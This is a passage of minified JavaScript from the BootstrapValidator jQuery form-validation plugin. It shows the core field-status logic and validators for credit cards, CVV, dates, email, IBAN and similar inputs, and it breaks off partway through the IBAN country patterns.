            f[this.STATUS_VALIDATING] = 0,
            f[this.STATUS_INVALID] = 0,
            f[this.STATUS_VALID] = 0;
            for (var i in e) {
                g++;
                var j = b.data("bv.result." + i);
                j && f[j]++
            }
            f[this.STATUS_VALID] == g ? (this.$invalidFields = this.$invalidFields.not(b),
            this.$form.trigger(a.Event("success.field.bv"), {
                field: d,
                element: b
            })) : 0 == f[this.STATUS_NOT_VALIDATED] && 0 == f[this.STATUS_VALIDATING] && f[this.STATUS_INVALID] > 0 && (this.$invalidFields = this.$invalidFields.add(b),
            this.$form.trigger(a.Event("error.field.bv"), {
                field: d,
                element: b
            }))
        },
        getFieldElements: function(b) {
            return this._cacheFields[b] || (this._cacheFields[b] = this.options.fields[b] && this.options.fields[b].selector ? a(this.options.fields[b].selector) : this.$form.find('[name="' + b + '"]')),
            this._cacheFields[b]
        },
        disableSubmitButtons: function(a) {
            return a ? "disabled" != this.options.live && this.$form.find(this.options.submitButtons).attr("disabled", "disabled") : this.$form.find(this.options.submitButtons).removeAttr("disabled"),
            this
        },
        validate: function() {
            if (!this.options.fields)
                return this;
            this.disableSubmitButtons(!0);
            for (var a in this.options.fields)
                this.validateField(a);
            return this._submit(),
            this
        },
        validateField: function(b) {
            var c, d = a([]);
            switch (typeof b) {
            case "object":
                d = b,
                b = b.attr("data-bv-field");
                break;
            case "string":
                d = this.getFieldElements(b)
            }
            if (this.options.fields[b] && 0 == this.options.fields[b].enabled)
                return this;
            for (var e, f, g = this, c = d.attr("type"), h = "radio" == c || "checkbox" == c ? 1 : d.length, i = "radio" == c || "checkbox" == c, j = this.options.fields[b].validators, k = 0; h > k; k++) {
                var l = d.eq(k);
                if (!this._isExcluded(l))
                    for (e in j) {
                        l.data("bv.dfs." + e) && l.data("bv.dfs." + e).reject();
                        var m = l.data("bv.result." + e);
                        m != this.STATUS_VALID && m != this.STATUS_INVALID ? (l.data("bv.result." + e, this.STATUS_VALIDATING),
                        f = a.fn.bootstrapValidator.validators[e].validate(this, l, j[e]),
                        "object" == typeof f ? (this.updateStatus(i ? b : l, this.STATUS_VALIDATING, e),
                        l.data("bv.dfs." + e, f),
                        f.done(function(a, b, c, d) {
                            a.removeData("bv.dfs." + b),
                            d && l.data("bv.messages").find('.help-block[data-bv-validator="' + b + '"][data-bv-for="' + a.attr("data-bv-field") + '"]').html(d),
                            g.updateStatus(i ? a.attr("data-bv-field") : a, c ? g.STATUS_VALID : g.STATUS_INVALID, b),
                            c && 1 == g._submitIfValid && g._submit()
                        })) : "boolean" == typeof f && this.updateStatus(i ? b : l, f ? this.STATUS_VALID : this.STATUS_INVALID, e)) : this._onFieldValidated(l, e)
                    }
            }
            return this
        },
        updateStatus: function(b, c, d) {
            var e, f = a([]);
            switch (typeof b) {
            case "object":
                f = b,
                b = b.attr("data-bv-field");
                break;
            case "string":
                f = this.getFieldElements(b)
            }
            for (var g = this, e = f.attr("type"), h = "radio" == e || "checkbox" == e ? 1 : f.length, i = 0; h > i; i++) {
                var j = f.eq(i)
                  , k = j.parents(".form-group")
                  , l = j.data("bv.messages")
                  , m = l.find('.help-block[data-bv-validator][data-bv-for="' + b + '"]')
                  , n = d ? m.filter('[data-bv-validator="' + d + '"]') : m
                  , o = k.find('.form-control-feedback[data-bv-icon-for="' + b + '"]')
                  , p = this.options.fields[b].container || this.options.container
                  , q = null;
                if (d)
                    j.data("bv.result." + d, c);
                else
                    for (var r in this.options.fields[b].validators)
                        j.data("bv.result." + r, c);
                n.attr("data-bv-result", c);
                var s, t, u = j.parents(".tab-pane");
                switch (u && (s = u.attr("id")) && (t = a('a[href="#' + s + '"][data-toggle="tab"]').parent()),
                c) {
                case this.STATUS_VALIDATING:
                    q = null,
                    this.disableSubmitButtons(!0),
                    k.removeClass("has-success").removeClass("has-error"),
                    o && o.removeClass(this.options.feedbackIcons.valid).removeClass(this.options.feedbackIcons.invalid).addClass(this.options.feedbackIcons.validating).show(),
                    t && t.removeClass("bv-tab-success").removeClass("bv-tab-error");
                    break;
                case this.STATUS_INVALID:
                    q = !1,
                    this.disableSubmitButtons(!0),
                    k.removeClass("has-success").addClass("has-error"),
                    o && o.removeClass(this.options.feedbackIcons.valid).removeClass(this.options.feedbackIcons.validating).addClass(this.options.feedbackIcons.invalid).show(),
                    t && t.removeClass("bv-tab-success").addClass("bv-tab-error");
                    break;
                case this.STATUS_VALID:
                    q = 0 == m.filter('[data-bv-result="' + this.STATUS_NOT_VALIDATED + '"]').length ? m.filter('[data-bv-result="' + this.STATUS_VALID + '"]').length == m.length : null,
                    null != q && (this.disableSubmitButtons(this.$submitButton ? !this.isValid() : !q),
                    o && o.removeClass(this.options.feedbackIcons.invalid).removeClass(this.options.feedbackIcons.validating).removeClass(this.options.feedbackIcons.valid).addClass(q ? this.options.feedbackIcons.valid : this.options.feedbackIcons.invalid).show()),
                    k.removeClass("has-error has-success").addClass(this.isValidContainer(k) ? "has-success" : "has-error"),
                    t && t.removeClass("bv-tab-success").removeClass("bv-tab-error").addClass(this.isValidContainer(u) ? "bv-tab-success" : "bv-tab-error");
                    break;
                case this.STATUS_NOT_VALIDATED:
                default:
                    q = null,
                    this.disableSubmitButtons(!1),
                    k.removeClass("has-success").removeClass("has-error"),
                    o && o.removeClass(this.options.feedbackIcons.valid).removeClass(this.options.feedbackIcons.invalid).removeClass(this.options.feedbackIcons.validating).hide(),
                    t && t.removeClass("bv-tab-success").removeClass("bv-tab-error")
                }
                switch (!0) {
                case o && "tooltip" == p:
                    q === !1 ? o.css("cursor", "pointer").tooltip("destroy").tooltip({
                        html: !0,
                        placement: "top",
                        title: m.filter('[data-bv-result="' + g.STATUS_INVALID + '"]').eq(0).html()
                    }) : o.css("cursor", "").tooltip("destroy");
                    break;
                case o && "popover" == p:
                    q === !1 ? o.css("cursor", "pointer").popover("destroy").popover({
                        content: m.filter('[data-bv-result="' + g.STATUS_INVALID + '"]').eq(0).html(),
                        html: !0,
                        placement: "top",
                        trigger: "hover click"
                    }) : o.css("cursor", "").popover("destroy");
                    break;
                default:
                    c == this.STATUS_INVALID ? n.show() : n.hide()
                }
                this.$form.trigger(a.Event("status.field.bv"), {
                    field: b,
                    element: j,
                    status: c
                }),
                this._onFieldValidated(j, d)
            }
            return this
        },
        isValid: function() {
            for (var a in this.options.fields)
                if (!this.isValidField(a))
                    return !1;
            return !0
        },
        isValidField: function(b) {
            var c = a([]);
            switch (typeof b) {
            case "object":
                c = b,
                b = b.attr("data-bv-field");
                break;
            case "string":
                c = this.getFieldElements(b)
            }
            if (0 == c.length || null == this.options.fields[b] || 0 == this.options.fields[b].enabled)
                return !0;
            for (var d, e, f, g = c.attr("type"), h = "radio" == g || "checkbox" == g ? 1 : c.length, i = 0; h > i; i++)
                if (d = c.eq(i),
                !this._isExcluded(d))
                    for (e in this.options.fields[b].validators)
                        if (f = d.data("bv.result." + e),
                        f != this.STATUS_VALID)
                            return !1;
            return !0
        },
        isValidContainer: function(b) {
            var c = this
              , d = {};
            b.find("[data-bv-field]").each(function() {
                var b = a(this).attr("data-bv-field");
                d[b] || (d[b] = a(this))
            });
            for (var e in d) {
                var f = d[e];
                if (0 != f.data("bv.messages").find('.help-block[data-bv-validator][data-bv-for="' + e + '"]').filter(function() {
                    var b = a(this).attr("data-bv-validator");
                    return f.data("bv.result." + b) && f.data("bv.result." + b) != c.STATUS_VALID
                }).length)
                    return !1
            }
            return !0
        },
        defaultSubmit: function() {
            this.$submitButton && a("<input/>").attr("type", "hidden").attr("data-bv-submit-hidden", "").attr("name", this.$submitButton.attr("name")).val(this.$submitButton.val()).appendTo(this.$form),
            this.$form.off("submit.bv").submit()
        },
        getInvalidFields: function() {
            return this.$invalidFields
        },
        getSubmitButton: function() {
            return this.$submitButton
        },
        getErrors: function(b) {
            var c = this
              , d = []
              , e = a([]);
            switch (!0) {
            case b && "object" == typeof b:
                e = b;
                break;
            case b && "string" == typeof b:
                var f = this.getFieldElements(b);
                if (f.length > 0) {
                    var g = f.attr("type");
                    e = "radio" == g || "checkbox" == g ? f.eq(0) : f
                }
                break;
            default:
                e = this.$invalidFields
            }
            return e.each(function() {
                d = d.concat(a(this).data("bv.messages").find('.help-block[data-bv-for="' + a(this).attr("data-bv-field") + '"][data-bv-result="' + c.STATUS_INVALID + '"]').map(function() {
                    return a(this).html()
                }).get())
            }),
            d
        },
        addField: function(b, c) {
            var d = a([]);
            switch (typeof b) {
            case "object":
                d = b,
                b = b.attr("data-bv-field") || b.attr("name");
                break;
            case "string":
                delete this._cacheFields[b],
                d = this.getFieldElements(b)
            }
            d.attr("data-bv-field", b);
            for (var e = d.attr("type"), f = "radio" == e || "checkbox" == e ? 1 : d.length, g = 0; f > g; g++) {
                var h = d.eq(g)
                  , i = this._parseOptions(h);
                i = null == i ? c : a.extend(!0, c, i),
                this.options.fields[b] = a.extend(!0, this.options.fields[b], i),
                this._cacheFields[b] = this._cacheFields[b] ? this._cacheFields[b].add(h) : h,
                this._initField("checkbox" == e || "radio" == e ? b : h)
            }
            return this.disableSubmitButtons(!1),
            this.$form.trigger(a.Event("added.field.bv"), {
                field: b,
                element: d,
                options: this.options.fields[b]
            }),
            this
        },
        removeField: function(b) {
            var c = a([]);
            switch (typeof b) {
            case "object":
                c = b,
                b = b.attr("data-bv-field") || b.attr("name"),
                c.attr("data-bv-field", b);
                break;
            case "string":
                c = this.getFieldElements(b)
            }
            if (0 == c.length)
                return this;
            for (var d = c.attr("type"), e = "radio" == d || "checkbox" == d ? 1 : c.length, f = 0; e > f; f++) {
                var g = c.eq(f);
                this.$invalidFields = this.$invalidFields.not(g),
                this._cacheFields[b] = this._cacheFields[b].not(g)
            }
            return this._cacheFields[b] && 0 != this._cacheFields[b].length || delete this.options.fields[b],
            ("checkbox" == d || "radio" == d) && this._initField(b),
            this.disableSubmitButtons(!1),
            this.$form.trigger(a.Event("removed.field.bv"), {
                field: b,
                element: c
            }),
            this
        },
        resetForm: function(b) {
            var c, d, e, f, g;
            for (c in this.options.fields) {
                d = this.getFieldElements(c),
                e = d.length;
                for (var h = 0; e > h; h++)
                    for (g in this.options.fields[c].validators)
                        d.eq(h).removeData("bv.dfs." + g);
                this.updateStatus(c, this.STATUS_NOT_VALIDATED),
                b && (f = d.attr("type"),
                "radio" == f || "checkbox" == f ? d.removeAttr("checked").removeAttr("selected") : d.val(""))
            }
            return this.$invalidFields = a([]),
            this.$submitButton = null,
            this.disableSubmitButtons(!1),
            this
        },
        enableFieldValidators: function(a, b) {
            return this.options.fields[a].enabled != b && (this.options.fields[a].enabled = b,
            this.updateStatus(a, this.STATUS_NOT_VALIDATED)),
            this
        },
        destroy: function() {
            var a, b, c, d, e, f;
            for (a in this.options.fields) {
                b = this.getFieldElements(a),
                f = this.options.fields[a].container || this.options.container;
                for (var g = 0; g < b.length; g++) {
                    if (c = b.eq(g),
                    c.data("bv.messages").find('.help-block[data-bv-validator][data-bv-for="' + a + '"]').remove().end().end().removeData("bv.messages").parents(".form-group").removeClass("has-feedback has-error has-success").end().off(".bv").removeAttr("data-bv-field"),
                    e = c.parents(".form-group").find('i[data-bv-icon-for="' + a + '"]'))
                        switch (f) {
                        case "tooltip":
                            e.tooltip("destroy").remove();
                            break;
                        case "popover":
                            e.popover("destroy").remove();
                            break;
                        default:
                            e.remove()
                        }
                    for (d in this.options.fields[a].validators)
                        c.removeData("bv.result." + d).removeData("bv.dfs." + d)
                }
            }
            this.disableSubmitButtons(!1),
            this.$form.removeClass(this.options.elementClass).off(".bv").removeData("bootstrapValidator").find("[data-bv-submit-hidden]").remove()
        }
    },
    a.fn.bootstrapValidator = function(c) {
        var d = arguments;
        return this.each(function() {
            var e = a(this)
              , f = e.data("bootstrapValidator")
              , g = "object" == typeof c && c;
            f || (f = new b(this,g),
            e.data("bootstrapValidator", f)),
            "string" == typeof c && f[c].apply(f, Array.prototype.slice.call(d, 1))
        })
    }
    ,
    a.fn.bootstrapValidator.validators = {},
    a.fn.bootstrapValidator.Constructor = b,
    a.fn.bootstrapValidator.helpers = {
        date: function(a, b, c, d) {
            if (isNaN(a) || isNaN(b) || isNaN(c))
                return !1;
            if (1e3 > a || a > 9999 || 0 == b || b > 12)
                return !1;
            var e = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
            if ((a % 400 == 0 || a % 100 != 0 && a % 4 == 0) && (e[1] = 29),
            0 > c || c > e[b - 1])
                return !1;
            if (d === !0) {
                var f = new Date
                  , g = f.getFullYear()
                  , h = f.getMonth()
                  , i = f.getDate();
                return g > a || a == g && h > b - 1 || a == g && b - 1 == h && i > c
            }
            return !0
        },
        luhn: function(a) {
            for (var b = a.length, c = 0, d = [[0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 2, 4, 6, 8, 1, 3, 5, 7, 9]], e = 0; b--; )
                e += d[c][parseInt(a.charAt(b), 10)],
                c ^= 1;
            return e % 10 === 0 && e > 0
        },
        mod_11_10: function(a) {
            for (var b = 5, c = a.length, d = 0; c > d; d++)
                b = (2 * (b || 10) % 11 + parseInt(a.charAt(d), 10)) % 10;
            return 1 == b
        },
        mod_37_36: function(a, b) {
            b = b || "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            for (var c = b.length, d = a.length, e = Math.floor(c / 2), f = 0; d > f; f++)
                e = (2 * (e || c) % (c + 1) + b.indexOf(a.charAt(f))) % c;
            return 1 == e
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.base64 = {
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$/.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.between = {
        html5Attributes: {
            message: "message",
            min: "min",
            max: "max",
            inclusive: "inclusive"
        },
        enableByHtml5: function(a) {
            return "range" == a.attr("type") ? {
                min: a.attr("min"),
                max: a.attr("max")
            } : !1
        },
        validate: function(a, b, c) {
            var d = b.val();
            return "" == d ? !0 : (d = parseFloat(d),
            c.inclusive === !0 || void 0 == c.inclusive ? d >= c.min && d <= c.max : d > c.min && d < c.max)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.callback = {
        validate: function(b, c, d) {
            var e = c.val();
            if (d.callback && "function" == typeof d.callback) {
                var f = new a.Deferred
                  , g = d.callback.call(this, e, b, c);
                return f.resolve(c, "callback", "boolean" == typeof g ? g : g.valid, "object" == typeof g && g.message ? g.message : null),
                f
            }
            return !0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.choice = {
        html5Attributes: {
            message: "message",
            min: "min",
            max: "max"
        },
        validate: function(a, b, c) {
            var d = b.is("select") ? a.getFieldElements(b.attr("data-bv-field")).find("option").filter(":selected").length : a.getFieldElements(b.attr("data-bv-field")).filter(":checked").length;
            return c.min && d < c.min || c.max && d > c.max ? !1 : !0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.creditCard = {
        validate: function(b, c) {
            var d = c.val();
            if ("" == d)
                return !0;
            if (/[^0-9-\s]+/.test(d))
                return !1;
            if (d = d.replace(/\D/g, ""),
            !a.fn.bootstrapValidator.helpers.luhn(d))
                return !1;
            var e, f, g = {
                AMERICAN_EXPRESS: {
                    length: [15],
                    prefix: ["34", "37"]
                },
                DINERS_CLUB: {
                    length: [14],
                    prefix: ["300", "301", "302", "303", "304", "305", "36"]
                },
                DINERS_CLUB_US: {
                    length: [16],
                    prefix: ["54", "55"]
                },
                DISCOVER: {
                    length: [16],
                    prefix: ["6011", "622126", "622127", "622128", "622129", "62213", "62214", "62215", "62216", "62217", "62218", "62219", "6222", "6223", "6224", "6225", "6226", "6227", "6228", "62290", "62291", "622920", "622921", "622922", "622923", "622924", "622925", "644", "645", "646", "647", "648", "649", "65"]
                },
                JCB: {
                    length: [16],
                    prefix: ["3528", "3529", "353", "354", "355", "356", "357", "358"]
                },
                LASER: {
                    length: [16, 17, 18, 19],
                    prefix: ["6304", "6706", "6771", "6709"]
                },
                MAESTRO: {
                    length: [12, 13, 14, 15, 16, 17, 18, 19],
                    prefix: ["5018", "5020", "5038", "6304", "6759", "6761", "6762", "6763", "6764", "6765", "6766"]
                },
                MASTERCARD: {
                    length: [16],
                    prefix: ["51", "52", "53", "54", "55"]
                },
                SOLO: {
                    length: [16, 18, 19],
                    prefix: ["6334", "6767"]
                },
                UNIONPAY: {
                    length: [16, 17, 18, 19],
                    prefix: ["622126", "622127", "622128", "622129", "62213", "62214", "62215", "62216", "62217", "62218", "62219", "6222", "6223", "6224", "6225", "6226", "6227", "6228", "62290", "62291", "622920", "622921", "622922", "622923", "622924", "622925"]
                },
                VISA: {
                    length: [16],
                    prefix: ["4"]
                }
            };
            for (e in g)
                for (f in g[e].prefix)
                    if (d.substr(0, g[e].prefix[f].length) == g[e].prefix[f] && -1 != a.inArray(d.length, g[e].length))
                        return !0;
            return !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.cusip = {
        validate: function(b, c) {
            var d = c.val();
            if ("" == d)
                return !0;
            if (d = d.toUpperCase(),
            !/^[0-9A-Z]{9}$/.test(d))
                return !1;
            for (var e = a.map(d.split(""), function(a) {
                var b = a.charCodeAt(0);
                return b >= "A".charCodeAt(0) && b <= "Z".charCodeAt(0) ? b - "A".charCodeAt(0) + 10 : a
            }), f = e.length, g = 0, h = 0; f - 1 > h; h++) {
                var i = parseInt(e[h]);
                h % 2 != 0 && (i *= 2),
                i > 9 && (i -= 9),
                g += i
            }
            return g = (10 - g % 10) % 10,
            g == e[f - 1]
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.cvv = {
        html5Attributes: {
            message: "message",
            ccfield: "creditCardField"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            if (!/^[0-9]{3,4}$/.test(e))
                return !1;
            if (!d.creditCardField)
                return !0;
            var f = b.getFieldElements(d.creditCardField).val();
            if ("" == f)
                return !0;
            f = f.replace(/\D/g, "");
            var g, h, i = {
                AMERICAN_EXPRESS: {
                    length: [15],
                    prefix: ["34", "37"]
                },
                DINERS_CLUB: {
                    length: [14],
                    prefix: ["300", "301", "302", "303", "304", "305", "36"]
                },
                DINERS_CLUB_US: {
                    length: [16],
                    prefix: ["54", "55"]
                },
                DISCOVER: {
                    length: [16],
                    prefix: ["6011", "622126", "622127", "622128", "622129", "62213", "62214", "62215", "62216", "62217", "62218", "62219", "6222", "6223", "6224", "6225", "6226", "6227", "6228", "62290", "62291", "622920", "622921", "622922", "622923", "622924", "622925", "644", "645", "646", "647", "648", "649", "65"]
                },
                JCB: {
                    length: [16],
                    prefix: ["3528", "3529", "353", "354", "355", "356", "357", "358"]
                },
                LASER: {
                    length: [16, 17, 18, 19],
                    prefix: ["6304", "6706", "6771", "6709"]
                },
                MAESTRO: {
                    length: [12, 13, 14, 15, 16, 17, 18, 19],
                    prefix: ["5018", "5020", "5038", "6304", "6759", "6761", "6762", "6763", "6764", "6765", "6766"]
                },
                MASTERCARD: {
                    length: [16],
                    prefix: ["51", "52", "53", "54", "55"]
                },
                SOLO: {
                    length: [16, 18, 19],
                    prefix: ["6334", "6767"]
                },
                UNIONPAY: {
                    length: [16, 17, 18, 19],
                    prefix: ["622126", "622127", "622128", "622129", "62213", "62214", "62215", "62216", "62217", "62218", "62219", "6222", "6223", "6224", "6225", "6226", "6227", "6228", "62290", "62291", "622920", "622921", "622922", "622923", "622924", "622925"]
                },
                VISA: {
                    length: [16],
                    prefix: ["4"]
                }
            }, j = null;
            for (g in i)
                for (h in i[g].prefix)
                    if (f.substr(0, i[g].prefix[h].length) == i[g].prefix[h] && -1 != a.inArray(f.length, i[g].length)) {
                        j = g;
                        break
                    }
            return null == j ? !1 : "AMERICAN_EXPRESS" == j ? 4 == e.length : 3 == e.length
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.date = {
        html5Attributes: {
            message: "message",
            format: "format",
            separator: "separator"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            d.format = d.format || "MM/DD/YYYY";
            var f = d.format.split(" ")
              , g = f[0]
              , h = f.length > 1 ? f[1] : null
              , i = f.length > 2 ? f[2] : null
              , j = e.split(" ")
              , k = j[0]
              , l = j.length > 1 ? j[1] : null;
            if (f.length != j.length)
                return !1;
            var m = d.separator;
            if (m || (m = -1 != k.indexOf("/") ? "/" : -1 != k.indexOf("-") ? "-" : null),
            null == m || -1 == k.indexOf(m))
                return !1;
            k = k.split(m),
            g = g.split(m);
            var n = k[a.inArray("YYYY", g)]
              , o = k[a.inArray("MM", g)]
              , p = k[a.inArray("DD", g)]
              , q = null
              , r = null
              , s = null;
            if (h) {
                if (h = h.split(":"),
                l = l.split(":"),
                h.length != l.length)
                    return !1;
                if (r = l.length > 0 ? l[0] : null,
                q = l.length > 1 ? l[1] : null,
                s = l.length > 2 ? l[2] : null,
                s && (s = parseInt(s, 10),
                isNaN(s) || 0 > s || s > 60))
                    return !1;
                if (r && (r = parseInt(r, 10),
                isNaN(r) || 0 > r || r >= 24 || i && r > 12))
                    return !1;
                if (q && (q = parseInt(q, 10),
                isNaN(q) || 0 > q || q > 59))
                    return !1
            }
            return p = parseInt(p, 10),
            o = parseInt(o, 10),
            n = parseInt(n, 10),
            a.fn.bootstrapValidator.helpers.date(n, o, p)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.different = {
        html5Attributes: {
            message: "message",
            field: "field"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = a.getFieldElements(c.field);
            return null == e ? !0 : d != e.val() ? (a.updateStatus(c.field, a.STATUS_VALID, "different"),
            !0) : !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.digits = {
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /^\d+$/.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.ean = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            if (!/^(\d{8}|\d{12}|\d{13})$/.test(c))
                return !1;
            for (var d = c.length, e = 0, f = 8 == d ? [3, 1] : [1, 3], g = 0; d - 1 > g; g++)
                e += parseInt(c.charAt(g)) * f[g % 2];
            return e = 10 - e % 10,
            e == c.charAt(d - 1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.emailAddress = {
        enableByHtml5: function(a) {
            return "email" == a.attr("type")
        },
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            var d = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return d.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.file = {
        html5Attributes: {
            extension: "extension",
            maxsize: "maxSize",
            message: "message",
            type: "type"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            var f, g = d.extension ? d.extension.toLowerCase().split(",") : null, h = d.type ? d.type.toLowerCase().split(",") : null, i = window.File && window.FileList && window.FileReader;
            if (i)
                for (var j = c.get(0).files, k = j.length, l = 0; k > l; l++) {
                    if (d.maxSize && j[l].size > parseInt(d.maxSize))
                        return !1;
                    if (f = j[l].name.substr(j[l].name.lastIndexOf(".") + 1),
                    g && -1 == a.inArray(f.toLowerCase(), g))
                        return !1;
                    if (h && -1 == a.inArray(j[l].type.toLowerCase(), h))
                        return !1
                }
            else if (f = e.substr(e.lastIndexOf(".") + 1),
            g && -1 == a.inArray(f.toLowerCase(), g))
                return !1;
            return !0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.greaterThan = {
        html5Attributes: {
            message: "message",
            value: "value",
            inclusive: "inclusive"
        },
        enableByHtml5: function(a) {
            var b = a.attr("min");
            return b ? {
                value: b
            } : !1
        },
        validate: function(a, b, c) {
            var d = b.val();
            return "" == d ? !0 : (d = parseFloat(d),
            c.inclusive === !0 || void 0 == c.inclusive ? d >= c.value : d > c.value)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.grid = {
        validate: function(b, c) {
            var d = c.val();
            return "" == d ? !0 : (d = d.toUpperCase(),
            /^[GRID:]*([0-9A-Z]{2})[-\s]*([0-9A-Z]{5})[-\s]*([0-9A-Z]{10})[-\s]*([0-9A-Z]{1})$/g.test(d) ? (d = d.replace(/\s/g, "").replace(/-/g, ""),
            "GRID:" == d.substr(0, 5) && (d = d.substr(5)),
            a.fn.bootstrapValidator.helpers.mod_37_36(d)) : !1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.hex = {
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /^[0-9a-fA-F]+$/.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.hexColor = {
        enableByHtml5: function(a) {
            return "color" == a.attr("type")
        },
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /(^#[0-9A-F]{6}$)|(^#[0-9A-F]{3}$)/i.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.iban = {
        html5Attributes: {
            message: "message",
            country: "country"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            var f = {
                AD: "AD[0-9]{2}[0-9]{4}[0-9]{4}[A-Z0-9]{12}",
                AE: "AE[0-9]{2}[0-9]{3}[0-9]{16}",
                AL: "AL[0-9]{2}[0-9]{8}[A-Z0-9]{16}",
                AO: "AO[0-9]{2}[0-9]{21}",
                AT: "AT[0-9]{2}[0-9]{5}[0-9]{11}",
                AZ: "AZ[0-9]{2}[A-Z]{4}[A-Z0-9]{20}",
                BA: "BA[0-9]{2}[0-9]{3}[0-9]{3}[0-9]{8}[0-9]{2}",
                BE: "BE[0-9]{2}[0-9]{3}[0-9]{7}[0-9]{2}",
                BF: "BF[0-9]{2}[0-9]{23}",
                BG: "BG[0-9]{2}[A-Z]{4}[0-9]{4}[0-9]{2}[A-Z0-9]{8}",
                BH: "BH[0-9]{2}[A-Z]{4}[A-Z0-9]{14}",
                BI: "BI[0-9]{2}[0-9]{12}",
                BJ: "BJ[0-9]{2}[A-Z]{1}[0-9]{23}",
                BR: "BR[0-9]{2}[0-9]{8}[0-9]{5}[0-9]{10}[A-Z][A-Z0-9]",
                CH: "CH[0-9]{2}[0-9]{5}[A-Z0-9]{12}",
                CI: "CI[0-9]{2}[A-Z]{1}[0-9]{23}",
                CM: "CM[0-9]{2}[0-9]{23}",
                CR: "CR[0-9]{2}[0-9]{3}[0-9]{14}",
                CV: "CV[0-9]{2}[0-9]{21}",
                CY: "CY[0-9]{2}[0-9]{3}[0-9]{5}[A-Z0-9]{16}",
                CZ: "CZ[0-9]{2}[0-9]{20}",
                DE: "DE[0-9]{2}[0-9]{8}[0-9]{10}",
                DK: "DK[0-9]{2}[0-9]{14}",
                DO: "DO[0-9]{2}[A-Z0-9]{4}[0-9]{20}",
                DZ: "DZ[0-9]{2}[0-9]{20}",
                EE: "EE[0-9]{2}[0-9]{2}[0-9]{2}[0-9]{11}[0-9]{1}",
                ES: "ES[0-9]{2}[0-9]{4}[0-9]{4}[0-9]{1}[0-9]{1}[0-9]{10}",
                FI: "FI[0-9]{2}[0-9]{6}[0-9]{7}[0-9]{1}",
                FO: "FO[0-9]{2}[0-9]{4}[0-9]{9}[0-9]{1}",
                FR: "FR[0-9]{2}[0-9]{5}[0-9]{5}[A-Z0-9]{11}[0-9]{2}",
                GB: "GB[0-9]{2}[A-Z]{4}[0-9]{6}[0-9]{8}",
                GE: "GE[0-9]{2}[A-Z]{2}[0-9]{16}",
                GI: "GI[0-9]{2}[A-Z]{4}[A-Z0-9]{15}",
                GL: "GL[0-9]{2}[0-9]{4}[0-9]{9}[0-9]{1}",
                GR: "GR[0-9]{2}[0-9]{3}[0-9]{4}[A-Z0-9]{16}",
                GT: "GT[0-9]{2}[A-Z0-9]{4}[A-Z0-9]{20}",
                HR: "HR[0-9]{2}[0-9]{7}[0-9]{10}",
                HU: "HU[0-9]{2}[0-9]{3}[0-9]{4}[0-9]{1}[0-9]{15}[0-9]{1}",
                IE: "IE[0-9]{2}[A-Z]{4}[0-9]{6}[0-9]{8}",
                IL: "IL[0-9]{2}[0-9]{3}[0-9]{3}[0-9]{13}",
                IR: "IR[0-9]{2}[0-9]{22}",
                IS: "IS[0-9]{2}[0-9]{4}[0-9]{2}[0-9]{6}[0-9]{10}",
                IT: "IT[0-9]{2}[A-Z]{1}[0-9]{5}[0-9]{5}[A-Z0-9]{12}",
                JO: "JO[0-9]{2}[A-Z]{4}[0-9]{4}[0]{8}[A-Z0-9]{10}",
                KW: "KW[0-9]{2}[A-Z]{4}[0-9]{22}",
                KZ: "KZ[0-9]{2}[0-9]{3}[A-Z0-9]{13}",
                LB: "LB[0-9]{2}[0-9]{4}[A-Z0-9]{20}",
                LI: "LI[0-9]{2}[0-9]{5}[A-Z0-9]{12}",
                LT: "LT[0-9]{2}[0-9]{5}[0-9]{11}",
                LU: "LU[0-9]{2}[0-9]{3}[A-Z0-9]{13}",
                LV: "LV[0-9]{2}[A-Z]{4}[A-Z0-9]{13}",
                MC: "MC[0-9]{2}[0-9]{5}[0-9]{5}[A-Z0-9]{11}[0-9]{2}",
                MD: "MD[0-9]{2}[A-Z0-9]{20}",
